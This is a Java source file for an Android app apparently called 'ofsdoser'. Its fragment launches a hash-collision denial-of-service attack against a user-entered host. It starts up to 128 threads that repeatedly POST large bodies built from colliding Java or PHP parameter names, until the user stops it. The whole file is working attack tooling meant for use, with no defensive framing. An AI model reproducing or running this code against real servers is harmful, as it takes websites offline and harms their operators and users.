package net.openfiresecurity.ofsdoser.fragments;

import android.os.Bundle;
import android.support.v4.app.Fragment;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.CompoundButton;
import android.widget.EditText;
import android.widget.ProgressBar;
import android.widget.RadioButton;
import android.widget.SeekBar;
import android.widget.TextView;
import android.widget.Toast;
import android.widget.ToggleButton;

import net.openfiresecurity.ofsdoser.R;
import net.openfiresecurity.ofsdoser.util.Lists;
import net.openfiresecurity.ofsdoser.util.ThreadInject;

import java.util.List;

/**
 * Created by alex on 13.11.13.
 */
public class DosFragment extends Fragment implements Runnable, SeekBar.OnSeekBarChangeListener {

    private int[] states = new int[200];
    private volatile Thread t;
    private RadioButton rbJava;
    private ToggleButton tb;
    private ProgressBar cpb;
    private EditText etTarget;
    private SeekBar sbThreads, sbPacketSize;
    private boolean shouldRun = false;
    private TextView tvPacketSize, tvThreads;
    private Toast mToast;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
    }

    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
        View v = inflater.inflate(R.layout.fragment_doser, container, false);

        tb = (ToggleButton) v.findViewById(R.id.tbHashDos);
        tb.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
            @Override
            public void onCheckedChanged(CompoundButton arg0, boolean arg1) {
                if (checkArguments()) {
                    if (arg1) {
                        makeToast("DoS Initiated!");
                        cpb.setVisibility(View.VISIBLE);
                        shouldRun = true;
                        startThread();
                    } else {
                        makeToast("DoS Stopped!");
                        cpb.setVisibility(View.INVISIBLE);
                        shouldRun = false;
                        stopThread();
                    }
                } else {
                    makeToast("Please recheck your Settings again.\nCouldnt start the DoS.");
                    tb.setChecked(false);
                }
            }

            private boolean checkArguments() {
                boolean valid = true;
                String check;
                check = etTarget.getText().toString();
                if (!(check.contains("."))) {
                    valid = false;
                }
                return (valid);
            }
        });

        rbJava = (RadioButton) v.findViewById(R.id.radio1);
        cpb = (ProgressBar) v.findViewById(R.id.cbpHash);
        cpb.setVisibility(View.INVISIBLE);
        tvPacketSize = (TextView) v.findViewById(R.id.tvPacketSize);
        tvThreads = (TextView) v.findViewById(R.id.tvThreads);
        etTarget = (EditText) v.findViewById(R.id.etHashdosTarget);
        sbPacketSize = (SeekBar) v.findViewById(R.id.sbHashPacketSize);
        sbThreads = (SeekBar) v.findViewById(R.id.sbHashThreads);
        sbPacketSize.setMax(10240);
        sbThreads.setMax(128);
        sbPacketSize.setProgress(100);
        sbThreads.setProgress(1);
        tvPacketSize.setText("100");
        tvThreads.setText("1");

        sbPacketSize.setOnSeekBarChangeListener(this);
        sbThreads.setOnSeekBarChangeListener(this);

        return v;
    }

    @Override
    public void run() {
        while (shouldRun) {
            int threads = sbThreads.getProgress() + 1;
            int packetsize = sbPacketSize.getProgress() + 1;

            String url = "http://" + etTarget.getText().toString() + "/";
            ThreadInject[] t = new ThreadInject[threads];
            List<String> list;
            if (rbJava.isChecked()) {
                list = Lists.javaList;
            } else {
                list = Lists.phpList;
            }
            do {
                for (int i = 0; i < t.length; i++) {
                    t[i] = new ThreadInject(url, getPost(list,
                            packetsize * 1024));
                }
                for (ThreadInject aT : t) {
                    aT.start();
                }
                boolean stop;
                do {
                    for (int i = 0; i < t.length; i++) {
                        set(i, t[i].getLocalState());
                    }

                    try {
                        Thread.sleep(300L);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                    stop = true;
                    for (int i = 0; i < t.length; i++) {
                        if (states[i] < 6) {
                            stop = false;
                            break;

                        }
                    }
                } while (!stop);
            } while (shouldRun);
        }
        stopThread();
    }

    public synchronized void startThread() {
        if (t == null) {
            t = new Thread(this);
            assert t != null;
            t.start();
        }
    }

    public synchronized void stopThread() {
        if (t != null) {
            Thread stopper = t;
            t.interrupt();
            t = null;
            assert stopper != null;
            stopper.interrupt();
        }
    }

    public String getPost(List<String> completeList, int maxSize) {
        StringBuilder bu = new StringBuilder(maxSize);
        int reqSize = 0;
        for (String value : completeList) {
            reqSize += value.length() + 4;
            if (reqSize > (maxSize - 40)) {
                break;
            }
            bu.append("&");
            bu.append(value);
            bu.append("=a");
        }

        return bu.toString();
    }

    private void set(int i, int localState) {
        states[i] = localState;
    }

    private void makeToast(String msg) {
        if (mToast != null)
            mToast.cancel();

        mToast = Toast.makeText(getActivity(), msg, Toast.LENGTH_LONG);
        mToast.show();
    }

    @Override
    public void onProgressChanged(SeekBar seekBar, int progress, boolean b) {
        if (seekBar == sbPacketSize) {
            tvPacketSize.setText("" + (progress + 1));
        } else if (seekBar == sbThreads) {
            tvThreads.setText("" + (progress + 1));
        }
    }

    @Override
    public void onStartTrackingTouch(SeekBar seekBar) {

    }

    @Override
    public void onStopTrackingTouch(SeekBar seekBar) {

    }
}
